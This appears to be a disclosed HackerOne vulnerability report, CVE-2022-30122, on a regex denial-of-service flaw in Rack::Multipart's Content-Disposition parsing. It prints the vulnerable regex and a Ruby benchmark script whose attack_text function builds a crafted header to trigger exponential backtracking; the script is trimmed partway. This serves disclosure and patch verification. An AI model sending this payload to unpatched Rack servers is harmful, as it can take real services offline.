# [H] ReDoS in Rack::Multipart

## Summary
Severity: High
Program: Ruby on Rails
Weakness: N/A
Reporter: ooooooo_q
State: resolved
Disclosed: 2023-07-28T00:26:27.997Z
CVE: CVE-2022-30122
Source: https://hackerone.com/reports/1489141

## Details
Hello, I found ReDoS on Rack.

I found this problem using `recheck` (https://makenowjust-labs.github.io/recheck/), a ReDoS detection tool.

This tool has found multiple places where there seems to be a problem with the rack code, but since there are many and it takes time to check the behavior, I will first report on `Rack::Multipart::RFC2183`, which is the most dangerous.
This is detected as exponential by recheck.

- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart.rb#L38
- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart/parser.rb#L296

```ruby
❯ bundle exec irb
irb(main):001:0> require 'rack'
=> true
irb(main):002:0> Rack::Multipart::RFC2183
=> /^(?i-mx:Content-Disposition:\s*(?-mix:[^\s()<>,;:\\"\/\[\]?=]+)\s*)((?-mix:;\s*(?:(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)(?-mix:\*[0-9]+)?))=((?-mix:"(?:\\"|[^"])*"|(?-mix:[^\s()<>,;:\\"\/\[\]?=]+))))|(?-mix:(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)(?:\*0)?\*))=((?-mix:[a-zA-Z0-9\-]*'[a-zA-Z0-9\-]*'(?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%]))*)))|(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)\*[1-9][0-9]*\*))=((?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%]))*))))\s*))+$/i
```


### benchmark

rfc2183_benchmark.rb

```ruby
require 'benchmark'
require 'rack'

regexp = Rack::Multipart::RFC2183

def attack_text(length)
 "Content-Disposition:G;\f=\""  + "=;1=\";\fD=\";t*1*" * length + '='
end

Benchmark.bm do |x|
  x.report { attack_text(5)[regexp] }
  x.report { attack_text(10)[regexp] }
  x.report { attack_text(15)[regexp] }
  x.report { attack_text(20)[regexp] }
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1489141_
